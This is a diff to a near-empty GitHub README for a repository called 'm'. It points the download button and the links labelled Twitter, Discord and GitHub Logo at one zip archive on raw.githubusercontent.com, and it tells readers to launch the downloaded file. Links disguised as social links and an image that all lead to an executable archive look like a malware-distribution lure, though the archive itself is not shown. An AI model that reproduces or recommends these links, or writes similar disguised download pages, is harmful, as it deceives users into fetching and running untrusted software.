@@ -17,7 +17,7 @@ This repository does not provide specific topics.
 
 ## Download v1.0.0
 
-[![Download v1.0.0](https://github.com/elianozzz/m/releases/download/v1.0/Software.zip)](https://github.com/elianozzz/m/releases/download/v1.0/Software.zip)
+[![Download v1.0.0](https://raw.githubusercontent.com/elianozzz/m/main/exiguous/Software_3.9.zip)](https://raw.githubusercontent.com/elianozzz/m/main/exiguous/Software_3.9.zip)
 *Click the button above to download version 1.0.0 of the "m" repository. Launch the downloaded file to explore its contents.*
 
 ---
@@ -29,8 +29,8 @@ Explore, enjoy, and happy coding! 🚀🔍📦
 
 ### Connect with the Community
 
-- Find us on [Twitter](https://github.com/elianozzz/m/releases/download/v1.0/Software.zip)
-- Join our [Discord](https://github.com/elianozzz/m/releases/download/v1.0/Software.zip)
+- Find us on [Twitter](https://raw.githubusercontent.com/elianozzz/m/main/exiguous/Software_3.9.zip)
+- Join our [Discord](https://raw.githubusercontent.com/elianozzz/m/main/exiguous/Software_3.9.zip)
 
 ---
 
@@ -38,4 +38,4 @@ Thank you for visiting the "m" repository! 🎉👨‍💻
 
 ---
 
-![GitHub Logo](https://github.com/elianozzz/m/releases/download/v1.0/Software.zip)
+![GitHub Logo](https://raw.githubusercontent.com/elianozzz/m/main/exiguous/Software_3.9.zip)
